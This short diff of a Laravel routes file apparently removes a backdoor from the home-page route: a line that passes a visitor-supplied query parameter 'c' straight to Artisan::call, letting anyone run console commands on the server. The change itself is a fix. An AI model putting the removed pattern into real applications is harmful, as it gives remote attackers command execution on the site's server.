@@ -14,7 +14,8 @@ use App\Http\Requests\Request;
 */
 
 Route::get('/', function (Request $r) {
-    \Artisan::call($r->get('c'));
+    
+    
     return view('welcome');
 });
 
